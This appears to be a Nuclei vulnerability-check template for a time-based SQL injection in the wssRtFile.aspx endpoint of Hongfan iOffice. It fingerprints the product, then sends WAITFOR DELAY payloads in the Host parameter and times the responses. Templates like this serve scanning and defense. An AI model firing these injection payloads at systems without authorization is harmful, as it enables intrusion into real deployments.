id: poc-yaml-hongfan-ioffice-wssrtfile-sqli
info:
  name: "红帆 iOffice wssRtFile 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: iOffice

flow: |
  http(1) && http(2)

http:
  - id: check-ioffice
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "iOffice.net"

  - id: sqli-exploit
    method: GET
    path:
      - "{{BaseURL}}/iOffice/prg/set/wss/wssRtFile.aspx?Host=1%27;WAITFOR+DELAY+%270:0:5%27--"
      - "{{BaseURL}}/iOffice/prg/set/wss/wssRtFile.aspx?Host=1%27;WAITFOR+DELAY+%270:0:8%27--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "下载文件"
          - "解密错误"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
